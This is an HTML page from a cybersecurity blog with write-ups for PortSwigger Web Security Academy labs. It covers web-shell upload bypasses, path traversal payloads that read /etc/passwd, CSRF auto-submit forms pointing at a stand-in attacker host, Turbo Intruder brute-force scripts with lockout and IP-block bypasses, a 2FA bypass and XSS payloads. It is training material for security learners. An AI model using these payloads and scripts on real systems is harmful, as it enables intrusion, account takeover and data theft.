<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>PortSwigger Labs | The Cyber Security Blog</title>
<meta name="keywords" content="">
<meta name="description" content="Introduction This blog contains a series of writeups for PortSwigger Labs challenges, solved with and without using Burp Suite | 2024.
File upload vulnerabilities Lab: Web shell upload via Content-Type restriction bypass In this lab we have to exploit an upload vulnerability.
Go to &ldquo;My account&rdquo; and log in with the given credentials Username: wiener
Password: peter
After logging in, we get redirected to &ldquo;My account&rdquo; page where there is an input box to upload our Avatar photo.">
<meta name="author" content="">
<link rel="canonical" href="https://dimparar.github.io/thecybersecurityblog/docs/portswigger_labs/">
<link crossorigin="anonymous" href="/thecybersecurityblog/assets/css/stylesheet.e1d5379b61d412d35dcaf2371eec6bea8c023e307a0719dcab030767036d17f6.css" integrity="sha256-4dU3m2HUEtNdyvI3Huxr6owCPjB6BxncqwMHZwNtF/Y=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://dimparar.github.io/thecybersecurityblog/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://dimparar.github.io/thecybersecurityblog/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://dimparar.github.io/thecybersecurityblog/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://dimparar.github.io/thecybersecurityblog/apple-touch-icon.png">
<link rel="mask-icon" href="https://dimparar.github.io/thecybersecurityblog/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://dimparar.github.io/thecybersecurityblog/docs/portswigger_labs/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="PortSwigger Labs" />
<meta property="og:description" content="Introduction This blog contains a series of writeups for PortSwigger Labs challenges, solved with and without using Burp Suite | 2024.
File upload vulnerabilities Lab: Web shell upload via Content-Type restriction bypass In this lab we have to exploit an upload vulnerability.
Go to &ldquo;My account&rdquo; and log in with the given credentials Username: wiener
Password: peter
After logging in, we get redirected to &ldquo;My account&rdquo; page where there is an input box to upload our Avatar photo." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://dimparar.github.io/thecybersecurityblog/docs/portswigger_labs/" /><meta property="article:section" content="docs" />
<meta property="article:published_time" content="2024-10-29T22:01:23+02:00" />
<meta property="article:modified_time" content="2024-10-29T22:01:23+02:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="PortSwigger Labs"/>
<meta name="twitter:description" content="Introduction This blog contains a series of writeups for PortSwigger Labs challenges, solved with and without using Burp Suite | 2024.
File upload vulnerabilities Lab: Web shell upload via Content-Type restriction bypass In this lab we have to exploit an upload vulnerability.
Go to &ldquo;My account&rdquo; and log in with the given credentials Username: wiener
Password: peter
After logging in, we get redirected to &ldquo;My account&rdquo; page where there is an input box to upload our Avatar photo."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Docs",
      "item": "https://dimparar.github.io/thecybersecurityblog/docs/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "PortSwigger Labs",
      "item": "https://dimparar.github.io/thecybersecurityblog/docs/portswigger_labs/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "PortSwigger Labs",
  "name": "PortSwigger Labs",
  "description": "Introduction This blog contains a series of writeups for PortSwigger Labs challenges, solved with and without using Burp Suite | 2024.\nFile upload vulnerabilities Lab: Web shell upload via Content-Type restriction bypass In this lab we have to exploit an upload vulnerability.\nGo to \u0026ldquo;My account\u0026rdquo; and log in with the given credentials Username: wiener\nPassword: peter\nAfter logging in, we get redirected to \u0026ldquo;My account\u0026rdquo; page where there is an input box to upload our Avatar photo.",
  "keywords": [
    
  ],
  "articleBody": " Introduction This blog contains a series of writeups for PortSwigger Labs challenges, solved with and without using Burp Suite | 2024.\nFile upload vulnerabilities Lab: Web shell upload via Content-Type restriction bypass In this lab we have to exploit an upload vulnerability.\nGo to “My account” and log in with the given credentials Username: wiener\nPassword: peter\nAfter logging in, we get redirected to “My account” page where there is an input box to upload our Avatar photo. We want to check if there is any upload vulnerability we can exploit to get access to the server. For this cause we will use BurpSuite to analyze the POST request and response from the server.\nBy uploading a normal .jpeg file we are commanding a POST request: Notice the Content-Type: multipart/form-data;. This means that for each input of the form we have seperate Content-Disposision and Content-Type headers.\nIf we try any file, other than .jpeg and .png, an error message is returned as response. So the server checks somehow the file we upload and its extension to make sure that it is an image.\nThere is a possibility that the server in order to read the extension of the file provided, uses the Content-Type header. In this case we could easily bypass this validation by keeping the Content-Type: image/jpeg and changing the file data into a php webshell that can give us Remote Command Execution (RCE).\nLet’s give it a try! Send the POST request to the Repeater and insert the payload like this: Send the request. The avatar picture was changed successfully!\nNow let’s refresh the “My account” page and then press Ctrl+U to open the source code. Open the avatar photo in order to run the webshell.php. Then add to the URL ?cmd=cat+/home/carlos/secret.\nSubmit the code and voilla!\nLab: Web shell upload via path traversal Go to “My account” and log in with the given credentials Username: wiener\nPassword: peter\nAfter logging in, we get redirected to “My account” page where there is an input box to upload our Avatar photo. We want to check if there is any upload vulnerability we can exploit to get access to the server. For this cause we will use BurpSuite to analyze the POST request and response from the server.\nLet’s try to upload a webshell.php file (keep Content-Type: image/jpeg) in case the server uses it to identify the file extension. The response is Refresh the page and press Ctrl+U for the source code of the “My account” page. The path of the file we uploaded is If go to this path, we get our payload printed to the screen without being executed. So we need to find a workaround to execute this file. The server problably has permitted executing files from the specific folder /files/avatars as a defensive mechanism.\nIf we send request with filename=\"../webshell.php\", we get as response The file avatars/webshell.php has been uploaded.. Notice that the path hasn’t change regardless of ../, so it problably filters the path ignoring parts that could lead to a path traversal attack.\nThere are many payloads we can use, other than just typing ../. For example, let’s try URL encoding %2e%2e%2fwebshell.php (equal to ../webshell.php). As we can see now the response uploaded the file to /avatars/../webshell.php.\nBy opening the link we get a Not Found page. The URL is web-security-academy.net/files/avatars/..%2fwebshell.php, but if we remove ..%2f then we will go to the path that we uploaded the file web-security-academy.net/files/avatars/webshell.php. It loads. Now let’s see if the webshell works.\nweb-security-academy.net/files/avatars/webshell.php?cmd=cat+/home/carlos/secret\nSucess! We got the flag.\nPath traversal Lab: File path traversal, simple case Open the website along with BurpSuite Proxy to inspect the requests to the server. At the home page there are products for sale (Title, Image, Small Description).\nThe image is probably stored locally at the server, so we should check if it vulnerable at path traversal attacks.\nWhen we select a product we can see from BurpSuite Proxy the request GET /product?productId=1, with each product having each own ProductId. After this request there is another one, this time GET /image?filename=53.jpg for the image of the product.\nLet’s check if the second request is vulnerable to path traversal attacks. Change the request with BurpSuite Repeater to\nGET /image?filename=../../../etc/passwd Success! The response contains the data from /etc/passwd.\nLab: File path traversal, traversal sequences blocked with absolute path bypass Open the website along with BurpSuite Proxy to inspect the requests to the server. At the home page there are products for sale (Title, Image, Small Description).\nThe image is probably stored locally at the server, so we should check if it vulnerable at path traversal attacks.\nWhen we select a product we can see from BurpSuite Proxy the request GET /product?productId=1, with each product having each own ProductId. After this request there is another one, this time GET /image?filename=53.jpg for the image of the product.\nUsually all static content of a website is stored in a path like var/www/images at the server, so we want to exit this folder. If there is no validation or check then ../../../etc/passwd should work.\nUnfortunately, it’s not working. Maybe the server treats the path given to filename parameter as an absolute path, so let’s try giving /etc/passwd. Perfect, it just printed the /etc/passwd file contents in the reponse section of BurpSuite Repeater.\nNote: Try giving the absolute path of the file.\nLab: File path traversal, traversal sequences stripped non-recursively Same as before, open BurpSuite Proxy and send to Repeater the request GET /image?filename=53.jpg. This request is been commanded by the browser to load the image 53.jpg which is stored in the server. Let’s try some path traversal attacks.\n# First try to exit var/www/images ../../../etc/passwd #Nope # Now try Absolute Path /etc/passwd #No Luck # Server may have specific defences against path traversal attacks # like removing suspicious characters (../) ....//....//....//etc/passwd #Success Even though the server removes all ../ characters, the remaining path is exactly what we want ../../../etc/passwd.\nLab: File path traversal, traversal sequences stripped with superfluous URL-decode Same as before, open BurpSuite Proxy and send to Repeater the request GET /image?filename=53.jpg. This request is been commanded by the browser to load the image 53.jpg which is stored in the server. Let’s try some path traversal attacks.\n# First try to exit var/www/images ../../../etc/passwd #Nope # Now try Absolute Path /etc/passwd #Nope # Server may have specific defences against path traversal attacks # like removing suspicious characters (../) ....//....//....//etc/passwd #Nope # Use of URL Encoding # %2e = . # %2f = / %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd #Nope # Double URL Encoding # %25 = % %252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252Fpasswd #Success So in order to exploit this vulnearbility we need to encode our path traversal payload to Double URL Encoding.\nLab: File path traversal, validation of start of path Same as before, open BurpSuite Proxy and send to Repeater the request GET /image?filename=53.jpg. This request is been commanded by the browser to load the image 53.jpg which is stored in the server. Let’s try some path traversal attacks.\n# First try to exit var/www/images ../../../etc/passwd #Nope # Now try Absolute Path /etc/passwd #Nope # Server may have specific defences against path traversal attacks # like removing suspicious characters (../) ....//....//....//etc/passwd #Nope # Use of URL Encoding # %2e = . # %2f = / %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd #Nope # Double URL Encoding # %25 = % %252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252Fpasswd #Nothing # Server could take the absolute path and validate the base URL # For example here the absolute path is /var/www/images/53.jpg # and the base URL is /var/www/images /var/www/images/../../../etc/passwd #Success Lab: File path traversal, validation of file extension with null byte bypass Same as before, open BurpSuite Proxy and send to Repeater the request GET /image?filename=53.jpg. This request is been commanded by the browser to load the image 53.jpg which is stored in the server. Let’s try some path traversal attacks.\nThe methods from the other labs don’t apply here. Maybe the server checks the extention of the file, so let’s try to use NULL character to end the line before the .jpg to bypass the check. We need to use the URL encoded value %00.\n../../../etc.passwd%00.jpg CSRF Lab: CSRF vulnerability with no defenses Go to “My account” and log in with the given credentials Username: wiener\nPassword: peter\nNow we can see a section to change our email.\nIf we enter an email while having Burp Proxy running, we can see the POST request to /my-account/change-email HTTP/2 with body email=newemail%40normal.com.\nSo now we know that we need to construct an HTML that makes a POST request to /my-account/change-email HTTP/2 but has as body our email.\n\u003chtml\u003e \u003cbody\u003e \u003cform action=\"https://0a400076042ec1f4817e750d00c9009d.web-security-academy.net/my-account/change-email\" method=\"POST\"\u003e \u003cinput type=\"hidden\" name=\"email\" value=\"pwned@evil.com\" /\u003e \u003c/form\u003e \u003cscript\u003e document.forms[0].submit(); \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e Now by using social engineering methods we can trick the user to run this HTML file. If the user loads this page and is already authorized to the website, then his email will be changed without him noticing.\nNote: The delivery mechanisms for cross-site request forgery attacks are essentially the same as for reflected XSS. Typically, the attacker will place the malicious HTML onto a website that they control, and then induce victims to visit that website. This might be done by feeding the user a link to the website, via an email or social media message. Or if the attack is placed into a popular website (for example, in a user comment), they might just wait for users to visit the website. For example we could send an email with an image tag, like img src=\"http://attacker-server/csrf-exploit.html\" width=\"0\" height=\"0\" border=\"0\" redirecting to the above html file hosted on our server.\nIn this case we got a server ready by PortSwigger, so we just need to enter our payload and press the “Deliver exploit to victim”.\nWe have sucessfully solved the lab!\nLab: CSRF where token validation depends on request method In this case when we change the email we see the POST request containing a CSRF-token to prevent us from forging a fake request.\nBut if we change the request from POST to GET we can see its working. The defences for CSRF where applied only at POST requests, leaving the website vulnerable.\nSo now we can construct the appropriate HTML file that will submit this request.\n\u003chtml\u003e \u003cbody\u003e \u003cform action=\"https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email\"\u003e \u003cinput type=\"hidden\" name=\"email\" value=\"anything%40web-security-academy.net\"\u003e \u003c/form\u003e \u003cscript\u003e document.forms[0].submit(); \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e Enter the payload to PortSwigger server and press “Deliver exploit to victim”.\nAuthentication Lab: Username enumeration via different responses Navigate to the login page, /login. Open Burp proxy and inspect the request/response when trying some random credentials.\nFor example, if we enter admin:admin then the request is the following.\nSo we have the parameters username and password. Let’s use the Burp Interuder to bruteforce them. Right click and “Sent to Intruder”\nIn this lab challenge, we will use the given wordlists from portswigger academy.\nFirst configure the positions of the parameters we want to fuzz and select as Attack type, Cluster Bomb in order to check each word of the username wordlist with each password in the password wordlist.\nHere we have 101 usernames and 100 passwords, that means 10100 combinations. That’s quite a lot.\nIf we start the attack we can see that the most responses have printed the message “Invalid username”. But after a couple of minutes one is different length and has printed “Invalid password”.\nSo we found the username and now we only need to find the password. Stop the attack and configure Burp Intruder only for the password, now we have only 100 requests to do, which is a ot faster.\nThe length of the response is different from the others, we might have something interesting here. Indeed this is password.\nLab: Username enumeration via subtly different responses Navigate to the login page, /login. Open Burp proxy and inspect the request/response when trying some random credentials. With test:test credentials we get the message Invalid username or password..\nLet’s send the request to intruder and try to enumerate the username in case the server responds with a different message.\nGo to “Settings” and then “Grep Match”, to add the message and check the following box, “Flag result items with responses matching these expressions:”\nNow we can start the attack. Notice there is a username with flag not equal to 1, meaning that Burp din not find the expression we provided.\nBy inspecting the response it seems that the message that is printed is Invalid username or password, without a fullstop. That’s propably a mistake and this is another message printed when the username is correct. Let’s check if we are right.\nBruteforce password with username adkit.\nWe got 302 (Found) status code, let’s try the credentials. Great we just solved the lab.\nLab: Username enumeration via response timing Navigate to the login page, /login. Open Burp proxy. We have given some credentials, wiener:peter, let’s check the response in case we provide the right password and in case we provide a very long one.\nIt seems that the server took very long time to process the second password. This means that we might be able to check the validity of the username/password based on the time needed to get the response back.\nIn order to enumerate the username first we need to set as password an arbitary long string.\nusername=§test§\u0026password=aaaaaaaaaaaaa...aaaaaaa But after running this attack with Burp Intruder we can see that there is no findings and that’s becuase if we inpect one of the most recent requests we get the message, You have made too many incorrect login attempts. Please try again in 30 minute(s).\nThe server propably blocks an IP address if it spams too many requests.\nBy adding the header X-Forwarded-For with a random IP we can bypass this validation.\nNote:\nThe X-Forwarded-For (XFF) request header is a de-facto standard header for identifying the originating IP address of a client connecting to a web server through a proxy server. When a client connects directly to a server, the client’s IP address is sent to the server (and is often written to server access logs). But if a client connection passes through any forward or reverse proxies, the server only sees the final proxy’s IP address, which is often of little use. That’s especially true if the final proxy is a load balancer which is part of the same installation as the server. So, to provide a more-useful client IP address to the server, the X-Forwarded-For request header is used.\nSo we need to fuzz also the IP address of the X-Forwarded-For header. We can use a online generator to generate random IP Addresses.\nThis takes significantly more time to receive the response which propably means that the username is correct and the server tries to process the long password.\nWe have successfully solved the lab challenge.\nLab: Broken brute-force protection, IP block We have our credentials, wiener:peter and the victim’s username, carlos.\nIf we try a few times to login with different password, we get the message, You have made too many incorrect login attempts. Please try again in 1 minute(s)..\nEven if we provide the X-Forwarded-For header with a different IP Address in each request, we get the same message.\nBy sending a couple of failed requests we can easily detect that three false requests are permitted before blocking the IP address for one minute.\nHowever, if we log in to our account a third time, the failed login attempts are reset. This allows us to fuzz both the username and password, but every three attempts, we must provide valid credentials. This process can be somewhat inconvenient using Burp’s basic functionality, which is why we can leverage the Turbo Intruder extension.\nTurbo Intruder allows us to write Python scripts to customize and optimize the fuzzing process.\nSend the request by right clicking and selecting the “Send to turbo intruder”\nThen configure the positions to fuzz by adding %s to the request.\ndef queueRequests(target, wordlists): engine = RequestEngine( endpoint=target.endpoint, concurrentConnections=1, requestsPerConnection=100, pipeline=False ) it = 0 for word2 in open('/home/kali/Desktop/htb/pass_burp.txt'): word2 = word2.strip() # Remove any trailing whitespace/newlines if it \u003c 2: engine.queue(target.req, [\"carlos\", word2]) it += 1 else: engine.queue(target.req, [\"wiener\", 'peter']) it = 0 # Reset the counter after every 3rd iteration def handleResponse(req, interesting): if interesting: table.add(req) Notice that concurrentConnections=1 is set to ensure each request is sent sequentially, waiting for a response before proceeding to the next. Using multiple connections increases the likelihood of requests being processed out of order, which could lead to the server blocking the IP address.\nThe attack was successful, the password is love.\nLab: Username enumeration via account lock We know that the there will be some kind of blocking after some failed attempts. Let’s check this by sending the /login request to Turbo Intruder.\nWe want to fuzz the username with the wordlist and make at least 5 attepts so we can find if any username is triggering the account lock.\ndef queueRequests(target, wordlists): engine = RequestEngine( endpoint=target.endpoint, concurrentConnections=5, requestsPerConnection=100, pipeline=False ) it = 0 for word1 in open('/home/kali/Desktop/htb/usernames_burp.txt'): for i in range(0, 5): engine.queue(target.req, [word1.strip(), \"test\"]) def handleResponse(req, interesting): if interesting: table.add(req) If we filter by length we can see two responses with different length from the others, the username is oracle.\nLet’s see if we can fuzz the password with this username. Send the request of /login to Burp Intruder and configure it with a Sniper Type. Then provide the password wordlist.\nAs expected, most of the responses have printed the message You have made too many incorrect login attempts. Please try again in 1 minute(s)., but there is one, with password ashley that doesn’t print any message. This is our password.\nLab: 2FA simple bypass We have available the victim’s credentials, carlos:montoya so let’s try them. When we enter the credentials at login page then we get redirected to page login2. Let’s go to home page by modifying the url.\nIt seems that we are logged in now, by going to my account page we are in carlos account. We bypassed the 2-Factor-Authentication cause it was not properly implemented. We were already in logged-in state when going to login2 page so we were able to completely bypass it.\nCross-site Scripting (XSS) Lab: Reflected XSS into HTML context with nothing encoded Navigate to the website and check every input point. The most classic functionality we should check first is the search box.\nInsert something like abc'\"\u003e\u003c\u003e#;//-- in order to check if the server encodes some of the special characters.\nWe can also use Burp Proxy to intercept the request and send it to Repeater to analyze it along with its response. Before our payload we sould insert a string, like abc, as it would be much easier searching for it and subsequently finding the injection point (the context). Now that we can see that our checking payload is reflected to the website without any encoding or protection, let’s construct the real deal.\n\u003cscript\u003ealert(document.domain)\u003c/script\u003e // Context is inside h1 tag // Alternatives abc'\"\u003e\u003c\u003e\u003cimg src=1 onerror=alert(document.domain)\u003e We found the XSS vulnerability!\nLab: Stored XSS into HTML context with nothing encoded Navigate to the website and to the /post page. We can see that there is a comment section. When we write a comment and all the information that are nessesary we intercept the request.\nWe have a POST request to /post/comment with these parameters.\nIf our comment is not sanitized we could enter a payload to to the comment parameter to achieve Stored-XSS. Let’s give it a try.\nGreat now everytime someone loads this page and consequently loads the comment section with or malicious payload, will get a javascript message with the domain. This could be used by a malicious actor to steal cookies sessions and more.\nLab: DOM XSS in document.write sink using source location.search For this lab we will use a Burp Browser plugin, the DOM Invader. In this case it might be easy to detect the context of the injection in the javascript file, but in a more complicated website with minified js files it will be challenging and time consuming to do it manually.\nFirst make sure DOM Invader and Postmessage Interception is on.\nThen copy the canary and navigate to the website. Search all entry points by pasting the canary.\nFirst let’s examine the search functionality. After searching a random string we can see a new parameter to the url, /?search=test.\nNow paste the canary to this parameter or the search bar and open Developer Tools with F12. We can see a new tab with the DOM Invader plugin.\nThere is new message to DOM tab. If we click at the stack trace and go to the console tab we can see exactly the canary hit in the code.\nSo now we know that our payload is injected here. In order for our payload work we need to close first the img tag.\nWe could also use something like abc'\"\u003e\u003c\u003e, which is essentailly the same thing but it is a payload that could work in many cases.\nLab: DOM XSS in document.write sink using source location.search inside a select element Enable DOM Invader and navigate to the website. If we click to a product we can see that we are redirecting to something like /product?productId=1.\nMaybe the parameter productId is vulnerable to DOM XSS. Paste the canary, /product?productId=. Before even using DOM Invader we get an error page that this is not a valid productId. Let’s move on to the next entry point.\nIn each product page there is a check availability option.\nChoose a random location from the given ones and click “Check stock”. We can see that we get redirected again to /product page. There is propably another request happening here so let’s use Burp Proxy to intercept it and find out.\nWe have a POST request to /product/store with parameters productId and storeId. Let’s check the last one for DOM XSS.\nWe got a hit at DOM tab.\nThe injection is here: If we close the two tags, option and select, maybe we can inject an alert() payload.\n\u003c/option\u003e\u003c/select\u003e\u003cimg src=1 onerror=alert()\u003e Great we solved the lab!\nLab: DOM XSS in innerHTML sink using source location.search Navigate to the website and test the search functionality, by pasting the canary to the search parameter.\nFrom DOM Invader we get that the injection is inside innerHtml attribute, which means that we tags like ",
  "wordCount" : "4371",
  "inLanguage": "en",
  "datePublished": "2024-10-29T22:01:23+02:00",
  "dateModified": "2024-10-29T22:01:23+02:00",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://dimparar.github.io/thecybersecurityblog/docs/portswigger_labs/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "The Cyber Security Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://dimparar.github.io/thecybersecurityblog/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">

    <nav class="nav">
        <div class="head-class">
            <div class="logo">
                <a href="https://dimparar.github.io/thecybersecurityblog/" accesskey="h" title="The Cyber Security Blog (Alt + H)">The Cyber Security Blog</a>
                
            </div>
            <ul id="menu">
                
                <li>
                    <a href="https://dimparar.github.io/thecybersecurityblog/" title="Home">
                        <span>Home</span>
                    </a>
                </li>
                
                    <li>|</li>
                
                <li>
                    <a href="https://dimparar.github.io/thecybersecurityblog/blog/" title="Blog">
                        <span>Blog</span>
                    </a>
                </li>
                
                    <li>|</li>
                
                <li>
                    <a href="https://dimparar.github.io/thecybersecurityblog/tags/" title="Tags">
                        <span>Tags</span>
                    </a>
                </li>
                
                    <li>|</li>
                
                <li>
                    <a href="https://dimparar.github.io/thecybersecurityblog/about/" title="About">
                        <span>About</span>
                    </a>
                </li>
                
            </ul>
        </div>
    </nav>
</header>
<main class="main">

<article class="post-single">
  
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      PortSwigger Labs
    </h1>
    <div class="post-meta"><span title='2024-10-29 22:01:23 +0200 +0200'>29 Oct 2024</span>

</div>
  </header>
  <div class="toc">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#file-upload-vulnerabilities">File upload vulnerabilities</a></li>
    <li><a href="#path-traversal">Path traversal</a></li>
    <li><a href="#csrf">CSRF</a></li>
    <li><a href="#authentication">Authentication</a></li>
    <li><a href="#cross-site-scripting-xss">Cross-site Scripting (XSS)</a></li>
    <li><a href="#server-side-request-forfery-ssrf-vulnerabilities">Server-Side Request Forfery (SSRF) Vulnerabilities</a></li>
  </ul>
</nav>
  </div> 
  <div class="post-content"><hr>
<h2 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h2>
<p>This blog contains a series of writeups for PortSwigger Labs challenges, solved with and without using Burp Suite | 2024.</p>
<hr>
<h2 id="file-upload-vulnerabilities">File upload vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#file-upload-vulnerabilities">#</a></h2>
<h3 id="lab-web-shell-upload-via-content-type-restriction-bypass">Lab: Web shell upload via Content-Type restriction bypass<a hidden class="anchor" aria-hidden="true" href="#lab-web-shell-upload-via-content-type-restriction-bypass">#</a></h3>
<br>
<p>In this lab we have to exploit an upload vulnerability.</p>
<p>Go to &ldquo;My account&rdquo; and log in with the given credentials <br></p>
<p>Username: wiener<br>
Password: peter</p>
<p>After logging in, we get redirected to &ldquo;My account&rdquo; page where there is an input box to upload our Avatar photo. <br>
<img loading="lazy" src="lab1.png" alt="myaccount"  />

We want to check if there is any upload vulnerability we can exploit to get access to the server. For this cause we will use BurpSuite to analyze the POST request and response from the server.</p>
<p>By uploading a normal <code>.jpeg</code> file we are commanding a POST request:
<img loading="lazy" src="lab2.png" alt="post_request"  />
</p>
<p>Notice the <code>Content-Type: multipart/form-data;</code>. This means that for each input of the form we have seperate <code>Content-Disposision</code> and <code>Content-Type</code> headers.</p>
<p>If we try any file, other than <code>.jpeg</code> and <code>.png</code>, an error message is returned as response. So the server checks somehow the file we upload and its extension to make sure that it is an image.</p>
<p>There is a possibility that the server in order to read the extension of the file provided, uses the <code>Content-Type</code> header. In this case we could easily bypass this validation by keeping the <code>Content-Type: image/jpeg</code> and changing the file data into a php webshell that can give us Remote Command Execution (RCE).</p>
<p>Let&rsquo;s give it a try! Send the POST request to the Repeater and insert the payload like this:
<img loading="lazy" src="lab3.png" alt="payload"  />

Send the request. The avatar picture was changed successfully!</p>
<p>Now let&rsquo;s refresh the &ldquo;My account&rdquo; page and then press <code>Ctrl+U</code> to open the source code. Open the avatar photo in order to run the <code>webshell.php</code>. Then add to the URL <code>?cmd=cat+/home/carlos/secret</code>.</p>
<p>Submit the code and voilla!</p>
<hr>
<h3 id="lab-web-shell-upload-via-path-traversal">Lab: Web shell upload via path traversal<a hidden class="anchor" aria-hidden="true" href="#lab-web-shell-upload-via-path-traversal">#</a></h3>
<br>
<p>Go to &ldquo;My account&rdquo; and log in with the given credentials <br></p>
<p>Username: wiener<br>
Password: peter</p>
<p>After logging in, we get redirected to &ldquo;My account&rdquo; page where there is an input box to upload our Avatar photo. <br></p>
<p>We want to check if there is any upload vulnerability we can exploit to get access to the server. For this cause we will use BurpSuite to analyze the POST request and response from the server.</p>
<p>Let&rsquo;s try to upload a <code>webshell.php</code> file (keep <code>Content-Type: image/jpeg</code>) in case the server uses it to identify the file extension.
<img loading="lazy" src="lab10.png" alt="attack"  />
</p>
<p>The response is
<img loading="lazy" src="lab11.png" alt="attack_response"  />
</p>
<p>Refresh the page and press <code>Ctrl+U</code> for the source code of the &ldquo;My account&rdquo; page. The path of the file we uploaded is
<img loading="lazy" src="lab12.png" alt="path"  />
</p>
<p>If go to this path, we get our payload printed to the screen without being executed. So we need to find a workaround to execute this file. The server problably has permitted executing files from the specific folder <code>/files/avatars</code> as a defensive mechanism.</p>
<p>If we send request with <code>filename=&quot;../webshell.php&quot;</code>, we get as response <code>The file avatars/webshell.php has been uploaded.</code>. Notice that the path hasn&rsquo;t change regardless of <code>../</code>, so it problably filters the path ignoring parts that could lead to a path traversal attack.</p>
<p>There are many payloads we can use, other than just typing <code>../</code>. For example, let&rsquo;s try URL encoding <code>%2e%2e%2fwebshell.php</code> (equal to ../webshell.php).
As we can see now the response uploaded the file to <code>/avatars/../webshell.php</code>.</p>
<p><img loading="lazy" src="lab13.png" alt="path"  />
</p>
<p>By opening the link we get a <code>Not Found</code> page. The URL is <code>web-security-academy.net/files/avatars/..%2fwebshell.php</code>, but if we remove <code>..%2f</code> then we will go to the path that we uploaded the file <code>web-security-academy.net/files/avatars/webshell.php</code>. It loads. Now let&rsquo;s see if the webshell works.</p>
<p><code>web-security-academy.net/files/avatars/webshell.php?cmd=cat+/home/carlos/secret</code></p>
<p>Sucess! We got the flag.</p>
<hr>
<h2 id="path-traversal">Path traversal<a hidden class="anchor" aria-hidden="true" href="#path-traversal">#</a></h2>
<h3 id="lab-file-path-traversal-simple-case">Lab: File path traversal, simple case<a hidden class="anchor" aria-hidden="true" href="#lab-file-path-traversal-simple-case">#</a></h3>
<br>
<p>Open the website along with BurpSuite Proxy to inspect the requests to the server. At the home page there are products for sale (Title, Image, Small Description).</p>
<p>The image is probably stored locally at the server, so we should check if it vulnerable at path traversal attacks.</p>
<p>When we select a product we can see from BurpSuite Proxy the request <code>GET /product?productId=1</code>, with each product having each own ProductId. After this request there is another one, this time <code>GET /image?filename=53.jpg</code> for the image of the product.</p>
<p>Let&rsquo;s check if the second request is vulnerable to path traversal attacks.
Change the request with BurpSuite Repeater to</p>
<pre tabindex="0"><code>GET /image?filename=../../../etc/passwd
</code></pre><p><img loading="lazy" src="lab4.png" alt="traversal_attack"  />

Success! The response contains the data from <code>/etc/passwd</code>.</p>
<hr>
<h3 id="lab-file-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass">Lab: File path traversal, traversal sequences blocked with absolute path bypass<a hidden class="anchor" aria-hidden="true" href="#lab-file-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass">#</a></h3>
<br>
<p>Open the website along with BurpSuite Proxy to inspect the requests to the server. At the home page there are products for sale (Title, Image, Small Description).</p>
<p>The image is probably stored locally at the server, so we should check if it vulnerable at path traversal attacks.</p>
<p>When we select a product we can see from BurpSuite Proxy the request <code>GET /product?productId=1</code>, with each product having each own ProductId. After this request there is another one, this time <code>GET /image?filename=53.jpg</code> for the image of the product.</p>
<p>Usually all static content of a website is stored in a path like <code>var/www/images</code> at the server, so we want to exit this folder. If there is no validation or check then <code>../../../etc/passwd</code> should work.</p>
<p>Unfortunately, it&rsquo;s not working. Maybe the server treats the path given to <code>filename</code> parameter as an absolute path, so let&rsquo;s try giving <code>/etc/passwd</code>. Perfect, it just printed the <code>/etc/passwd</code> file contents in the reponse section of BurpSuite Repeater.</p>
<p><img loading="lazy" src="lab5.png" alt="attack"  />
</p>
<p>Note: Try giving the absolute path of the file.</p>
<hr>
